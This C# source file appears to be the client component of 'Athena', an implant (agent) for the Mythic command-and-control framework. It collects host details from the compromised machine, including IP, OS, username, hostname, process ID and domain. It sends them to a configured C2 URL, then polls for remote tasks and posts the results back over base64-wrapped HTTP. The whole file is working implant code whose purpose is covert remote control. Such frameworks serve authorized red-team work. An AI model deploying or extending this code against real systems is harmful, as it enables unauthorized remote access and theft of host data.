using Athena.Mythic.Hooks;
using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using Athena.Mythic.Model.Checkin;
using Athena.Mythic.Profile;
using System.Net;
using System.Diagnostics;
using Athena.Utilities;
using System.Net.Http;
using Newtonsoft.Json;
using Athena.Mythic.Model;
using Athena.Mythic.Model.Response;

namespace Athena
{
    public class MythicClient
    {
        public Config MythicConfig { get; set; }
        public MythicClient()
        {
            this.MythicConfig = new Config();
        }

        public CheckinResponse CheckIn()
        {
            if (Globals.encrypted)
            {
                //encrypt
            }
            switch (Globals.profile)
            {
                case ProfileType.HTTP:
                    break;
                case ProfileType.Websocket:
                    break;
                case ProfileType.SMB:
                    break;
            }
            Checkin ct = new Checkin()
            {
                action = "checkin",
                ip = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0].ToString(),
                os = Environment.OSVersion.ToString(),
                user = Environment.UserName,
                host = Dns.GetHostName(),
                pid = Process.GetCurrentProcess().Id.ToString(),
                uuid = this.MythicConfig.uuid,
                architecture = Misc.GetArch(),
                domain = Environment.UserDomainName,
            };
            var responseString = SendPOST(this.MythicConfig.postURL, ct).Result;
            CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(Misc.Base64Decode(responseString).Substring(36));
            return cs;
        }

        public List<MythicTask> GetTasks()
        {
            GetTasking gt = new GetTasking()
            {
                action = "get_tasking",
                tasking_size = -1,

            };
            var responseString = SendPOST(this.MythicConfig.postURL, gt).Result;
            GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(Misc.Base64Decode(responseString).Substring(36));
            return gtr.tasks;
        }

        public bool PostResponse(Dictionary<string,MythicJob> jobs)
        {
            List<ResponseResult> lrr = new List<ResponseResult>();
            foreach(var job in jobs.Values)
            {
                if (job.errored)
                {
                    //Probably turn this into a base response object and have that
                    ResponseResult rr = new ResponseResult()
                    {
                        task_id = job.task.id,
                        status = "error",
                        completed = "true",
                        user_output = job.taskresult
                    };
                    lrr.Add(rr);
                }
                else if(job.complete)
                {
                    ResponseResult rr = new ResponseResult()
                    {
                        task_id = job.task.id,
                        completed = "true",
                        user_output = job.taskresult,
                        status = "complete"
                    };
                    lrr.Add(rr);
                }
                else
                {
                    ResponseResult rr = new ResponseResult()
                    {
                        task_id = job.task.id,
                        //completed = "false",
                        user_output = job.taskresult,
                        status = "processed"
                    };
                    lrr.Add(rr);
                }
            }

            PostResponseResponse prr = new PostResponseResponse()
            {
                action = "post_response",
                responses = lrr
            };

            try
            {
                var responseString = SendPOST(this.MythicConfig.postURL, prr).Result;
                CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(Misc.Base64Decode(responseString).Substring(36));
                if (cs.status != "success")
                {
                    return false;
                }
            }
            catch
            {
                return false;
            }

            return true;
        }
        private async Task<string> SendGET(string url)
        {
            var response = await Globals.client.GetAsync(url, HttpCompletionOption.ResponseHeadersRead);
            return await response.Content.ReadAsStringAsync();
        }
        private async Task<string> SendPOST(string url, object obj)
        {
            string json = JsonConvert.SerializeObject(obj);
            var content = new StringContent(Misc.Base64Encode(this.MythicConfig.uuid + json));
            var response = await Globals.client.PostAsync(url, content);
            return await response.Content.ReadAsStringAsync();
        }
    }
}
